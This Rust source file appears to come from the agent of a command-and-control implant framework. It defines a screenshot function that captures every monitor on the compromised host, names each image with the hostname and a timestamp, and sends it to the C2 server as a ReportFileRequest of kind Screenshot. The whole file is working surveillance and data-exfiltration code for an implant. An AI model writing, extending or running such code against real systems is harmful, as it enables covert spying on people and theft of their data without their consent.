use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use chrono::Utc;
use eldritch_agent::{Agent, Context};
use pb::c2::{self, report_file_request};
use pb::eldritch;
use std::io::Cursor;
use xcap::Monitor;
use xcap::image::ImageFormat;

pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String> {
    let monitors = Monitor::all().map_err(|e| e.to_string())?;

    // Get hostname, handling potential failure or deprecation
    let hostname = whoami::fallible::hostname().unwrap_or_else(|_| "unknown".to_string());
    let timestamp = Utc::now().format("%Y%m%d_%H%M%S").to_string();

    for (i, monitor) in monitors.iter().enumerate() {
        let image = monitor.capture_image().map_err(|e| e.to_string())?;
        let mut buffer = Vec::new();
        image
            .write_to(&mut Cursor::new(&mut buffer), ImageFormat::Png)
            .map_err(|e| e.to_string())?;

        let filename = format!("screenshot_{}_{}_{}.png", hostname, timestamp, i);

        let metadata = eldritch::FileMetadata {
            path: filename.clone(),
            size: buffer.len() as u64,
            ..Default::default()
        };

        let file_msg = eldritch::File {
            metadata: Some(metadata),
            chunk: buffer,
        };

        let context_val = match context.clone() {
            Context::Task(tc) => Some(report_file_request::Context::TaskContext(tc)),
            Context::ShellTask(stc) => Some(report_file_request::Context::ShellTaskContext(stc)),
        };

        let req = c2::ReportFileRequest {
            context: context_val,
            chunk: Some(file_msg),
            kind: c2::ReportFileKind::Screenshot as i32,
        };

        agent.report_file(req).map_err(|e| e.to_string())?;
    }

    Ok(())
}
